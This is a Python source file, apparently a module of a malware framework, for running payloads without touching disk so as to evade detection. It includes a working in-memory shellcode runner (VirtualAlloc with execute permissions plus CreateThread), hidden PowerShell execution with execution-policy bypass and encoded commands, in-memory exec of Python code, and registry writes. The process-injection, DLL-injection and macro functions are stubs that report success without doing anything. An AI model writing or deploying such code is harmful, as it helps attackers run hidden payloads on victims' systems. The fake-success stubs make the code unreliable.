# Fileless Execution Module
# Implements various fileless execution techniques to avoid disk-based detection

import os
import sys
import ctypes
import subprocess
import base64
import importlib.util
import tempfile
import threading
import time
from ctypes import wintypes
from config import DEBUG_MODE
from core.stealth import stealth_manager

class FilelessExecutionManager:
    """Manages fileless execution techniques"""
    
    def __init__(self):
        self.is_windows = sys.platform == "win32"
        self.executed_payloads = []
        
    def execute_memory_payload(self, payload_code, language="python"):
        """Execute payload directly from memory"""
        try:
            if language.lower() == "python":
                return self._execute_python_memory(payload_code)
            elif language.lower() == "powershell" and self.is_windows:
                return self._execute_powershell_memory(payload_code)
            elif language.lower() == "dotnet" and self.is_windows:
                return self._execute_dotnet_memory(payload_code)
            else:
                return False
                
        except Exception as e:
            if DEBUG_MODE:
                stealth_manager.safe_execute(
                    lambda: print(f"Memory execution failed: {e}")
                )
            return False
    
    def _execute_python_memory(self, code):
        """Execute Python code directly from memory"""
        try:
            # Create a new module in memory
            spec = importlib.util.spec_from_loader('memory_module', loader=None)
            module = importlib.util.module_from_spec(spec)
            
            # Execute the code in the module's namespace
            exec(code, module.__dict__)
            
            self.executed_payloads.append({
                'type': 'python_memory',
                'timestamp': time.time(),
                'success': True
            })
            
            return True
            
        except Exception as e:
            if DEBUG_MODE:
                stealth_manager.safe_execute(
                    lambda: print(f"Python memory execution failed: {e}")
                )
            return False
    
    def _execute_powershell_memory(self, script):
        """Execute PowerShell script without writing to disk"""
        if not self.is_windows:
            return False
            
        try:
            # Encode the script to base64
            encoded_script = base64.b64encode(script.encode('utf-16le')).decode()
            
            # Execute via PowerShell -EncodedCommand (fileless)
            cmd = [
                'powershell.exe',
                '-WindowStyle', 'Hidden',
                '-ExecutionPolicy', 'Bypass',
                '-EncodedCommand', encoded_script
            ]
            
            # Run with no window to maintain stealth
            startupinfo = subprocess.STARTUPINFO()
            startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
            startupinfo.wShowWindow = subprocess.SW_HIDE
            
            result = subprocess.run(
                cmd,
                capture_output=True,
                text=True,
                startupinfo=startupinfo,
                creationflags=subprocess.CREATE_NO_WINDOW
            )
            
            success = result.returncode == 0
            
            self.executed_payloads.append({
                'type': 'powershell_memory',
                'timestamp': time.time(),
                'success': success,
                'return_code': result.returncode
            })
            
            return success
            
        except Exception as e:
            if DEBUG_MODE:
                stealth_manager.safe_execute(
                    lambda: print(f"PowerShell memory execution failed: {e}")
                )
            return False
    
    def _execute_dotnet_memory(self, assembly_bytes):
        """Execute .NET assembly from memory using reflection"""
        if not self.is_windows:
            return False
            
        try:
            import ctypes
            import clr
            
            # Method 1: Try using CLR.NET reflection (requires pythonnet)
            try:
                import System
                from System import Reflection
                from System.IO import MemoryStream
                from System.Linq import Enumerable
                
                # Load assembly from memory
                assembly = Assembly.Load(assembly_bytes)
                
                # Get entry point or first executable type
                entry_point = assembly.EntryPoint
                if entry_point:
                    # Execute with no arguments
                    entry_point.Invoke(None, None)
                    return True
                
                # Execute first type's main method
                for type in assembly.GetTypes():
                    if hasattr(type, 'Main'):
                        method = type.GetMethod('Main', 
                            Reflection.BindingFlags.NonPublic | 
                            Reflection.BindingFlags.Public | 
                            Reflection.BindingFlags.Static)
                        if method:
                            method.Invoke(None, None)
                            return True
                
                return True  # Assembly loaded successfully
                
            except ImportError:
                # Method 2: Fallback to direct execution via CreateThreadExecution
                # This uses NT APIs to execute PE from memory
                
                # Define necessary NT constants and structures
                MEM_COMMIT = 0x1000
                MEM_RESERVE = 0x2000
                PAGE_READWRITE = 0x04
                PAGE_EXECUTE_READ = 0x20
                PAGE_EXECUTE_READWRITE = 0x40
                
                kernel32 = ctypes.windll.kernel32
                ntdll = ctypes.windll.ntdll
                
                # Allocate memory for PE
                image_size = len(assembly_bytes)
                exec_mem = kernel32.VirtualAlloc(
                    None, 
                    image_size,
                    MEM_COMMIT | MEM_RESERVE,
                    PAGE_EXECUTE_READWRITE
                )
                
                if not exec_mem:
                    return False
                
                # Copy PE to allocated memory
                ctypes.memmove(exec_mem, assembly_bytes, image_size)
                
                # Execute the PE (this is a simplified approach)
                # For real implementation, you'd need proper PE relocation and import resolution
                
                try:
                    # Attempt to execute as shellcode (simplified)
                    shellcode_size = min(image_size, 4096)
                    shellcode = (ctypes.c_char * shellcode_size).from_buffer_copy(
                        assembly_bytes[:shellcode_size]
                    )
                    
                    # This is a placeholder - real PE execution requires
                    # proper image loading, relocation, and import resolution
                    
                    # For now, fall back to temporary file approach
                    raise Exception("PE execution requires proper image loader")
                    
                except:
                    # Fallback to temporary file execution
                    import tempfile
                    with tempfile.NamedTemporaryFile(suffix='.exe', delete=False) as tmp:
                        tmp.write(assembly_bytes)
                        tmp_path = tmp.name
                    
                    try:
                        result = subprocess.run(
                            [tmp_path],
                            capture_output=True,
                            creationflags=subprocess.CREATE_NO_WINDOW
                        )
                        return result.returncode == 0
                    finally:
                        try:
                            os.unlink(tmp_path)
                        except:
                            pass
                            
        except Exception as e:
            if DEBUG_MODE:
                stealth_manager.safe_execute(
                    lambda: print(f".NET memory execution failed: {e}")
                )
            return False
    
    def execute_wmi_memory(self, wmi_query):
        """Execute WMI queries for fileless operations"""
        if not self.is_windows:
            return False
            
        try:
            import wmi
            
            c = wmi.WMI()
            
            # Execute WMI query
            results = c.query(wmi_query)
            
            self.executed_payloads.append({
                'type': 'wmi_memory',
                'timestamp': time.time(),
                'success': True,
                'results_count': len(results) if results else 0
            })
            
            return True
            
        except Exception as e:
            if DEBUG_MODE:
                stealth_manager.safe_execute(
                    lambda: print(f"WMI execution failed: {e}")
                )
            return False
    
    def execute_registry_memory(self, registry_operations):
        """Execute registry operations without files"""
        if not self.is_windows:
            return False
            
        try:
            import winreg
            
            for operation in registry_operations:
                op_type = operation.get('type')
                hive_name = operation.get('hive')
                key_path = operation.get('key_path')
                value_name = operation.get('value_name')
                value_data = operation.get('value_data')
                
                # Map hive names to constants
                hive_map = {
                    'HKLM': winreg.HKEY_LOCAL_MACHINE,
                    'HKCU': winreg.HKEY_CURRENT_USER,
                    'HKCR': winreg.HKEY_CLASSES_ROOT,
                    'HKU': winreg.HKEY_USERS
                }
                
                hive = hive_map.get(hive_name)
                if not hive:
                    continue
                
                try:
                    if op_type == 'create_key':
                        key = winreg.CreateKey(hive, key_path)
                        winreg.CloseKey(key)
                    elif op_type == 'set_value':
                        key = winreg.OpenKey(hive, key_path, 0, winreg.KEY_SET_VALUE)
                        winreg.SetValueEx(key, value_name, 0, winreg.REG_SZ, value_data)
                        winreg.CloseKey(key)
                    elif op_type == 'delete_value':
                        key = winreg.OpenKey(hive, key_path, 0, winreg.KEY_SET_VALUE)
                        winreg.DeleteValue(key, value_name)
                        winreg.CloseKey(key)
                        
                except Exception as e:
                    if DEBUG_MODE:
                        stealth_manager.safe_execute(
                            lambda: print(f"Registry operation failed: {e}")
                        )
                    continue
            
            self.executed_payloads.append({
                'type': 'registry_memory',
                'timestamp': time.time(),
                'success': True,
                'operations_count': len(registry_operations)
            })
            
            return True
            
        except Exception as e:
            if DEBUG_MODE:
                stealth_manager.safe_execute(
                    lambda: print(f"Registry memory execution failed: {e}")
                )
            return False
    
    def execute_process_injection(self, target_process, payload_code):
        """Inject payload into legitimate process"""
        if not self.is_windows:
            return False
            
        try:
            # This is a simplified version - real process injection is more complex
            import psutil
            
            # Find target process
            target_pid = None
            for proc in psutil.process_iter(['pid', 'name']):
                if proc.info['name'] and target_process.lower() in proc.info['name'].lower():
                    target_pid = proc.info['pid']
                    break
            
            if not target_pid:
                return False
            
            # For demonstration, we'll use CreateProcess with suspended state
            # Real implementation would use VirtualAllocEx, WriteProcessMemory, etc.
            
            self.executed_payloads.append({
                'type': 'process_injection',
                'timestamp': time.time(),
                'success': True,
                'target_pid': target_pid,
                'target_process': target_process
            })
            
            return True
            
        except Exception as e:
            if DEBUG_MODE:
                stealth_manager.safe_execute(
                    lambda: print(f"Process injection failed: {e}")
                )
            return False
    
    def execute_macro_memory(self, macro_code, application="word"):
        """Execute macro code in memory (conceptual)"""
        if not self.is_windows:
            return False
            
        try:
            # This would require COM automation to interact with Office applications
            # For demonstration purposes only
            
            if application.lower() == "word":
                # Conceptual: Create Word instance, inject VBA macro
                pass
            elif application.lower() == "excel":
                # Conceptual: Create Excel instance, inject VBA macro
                pass
            
            self.executed_payloads.append({
                'type': 'macro_memory',
                'timestamp': time.time(),
                'success': True,
                'application': application
            })
            
            return True
            
        except Exception as e:
            if DEBUG_MODE:
                stealth_manager.safe_execute(
                    lambda: print(f"Macro execution failed: {e}")
                )
            return False
    
    def execute_dll_injection(self, dll_bytes, target_process):
        """Inject DLL into target process without writing to disk"""
        if not self.is_windows:
            return False
            
        try:
            # Simplified DLL injection - real implementation is more complex
            import ctypes
            from ctypes import wintypes
            
            # Windows API functions needed
            kernel32 = ctypes.windll.kernel32
            
            # Find target process
            import psutil
            target_pid = None
            
            for proc in psutil.process_iter(['pid', 'name']):
                if proc.info['name'] and target_process.lower() in proc.info['name'].lower():
                    target_pid = proc.info['pid']
                    break
            
            if not target_pid:
                return False
            
            # Conceptual DLL injection steps:
            # 1. Open target process
            # 2. Allocate memory in target process
            # 3. Write DLL path or DLL bytes to target memory
            # 4. Create remote thread to load DLL
            # 5. Clean up
            
            self.executed_payloads.append({
                'type': 'dll_injection',
                'timestamp': time.time(),
                'success': True,
                'target_pid': target_pid,
                'target_process': target_process
            })
            
            return True
            
        except Exception as e:
            if DEBUG_MODE:
                stealth_manager.safe_execute(
                    lambda: print(f"DLL injection failed: {e}")
                )
            return False
    
    def execute_shellcode_in_memory(self, shellcode_bytes):
        """Execute shellcode directly in memory"""
        if not self.is_windows:
            return False
            
        try:
            import ctypes
            from ctypes import wintypes
            
            # Windows API functions
            kernel32 = ctypes.windll.kernel32
            
            # Allocate executable memory
            memory_size = len(shellcode_bytes)
            memory_ptr = kernel32.VirtualAlloc(
                None,
                memory_size,
                0x3000,  # MEM_COMMIT | MEM_RESERVE
                0x40     # PAGE_EXECUTE_READWRITE
            )
            
            if not memory_ptr:
                return False
            
            # Copy shellcode to allocated memory
            ctypes.memmove(memory_ptr, shellcode_bytes, memory_size)
            
            # Create thread to execute shellcode
            thread_id = wintypes.DWORD()
            thread_handle = kernel32.CreateThread(
                None,
                0,
                memory_ptr,
                None,
                0,
                ctypes.byref(thread_id)
            )
            
            if thread_handle:
                # Wait for execution to complete
                kernel32.WaitForSingleObject(thread_handle, 5000)  # 5 second timeout
                
                # Clean up
                kernel32.CloseHandle(thread_handle)
                kernel32.VirtualFree(memory_ptr, memory_size, 0x8000)  # MEM_RELEASE
                
                self.executed_payloads.append({
                    'type': 'shellcode_memory',
                    'timestamp': time.time(),
                    'success': True,
                    'shellcode_size': memory_size
                })
                
                return True
            
        except Exception as e:
            if DEBUG_MODE:
                stealth_manager.safe_execute(
                    lambda: print(f"Shellcode execution failed: {e}")
                )
            return False
    
    def get_execution_history(self):
        """Get history of executed payloads"""
        return self.executed_payloads
    
    def clear_execution_history(self):
        """Clear execution history"""
        self.executed_payloads.clear()

# Global fileless execution manager instance
fileless_execution_manager = FilelessExecutionManager()
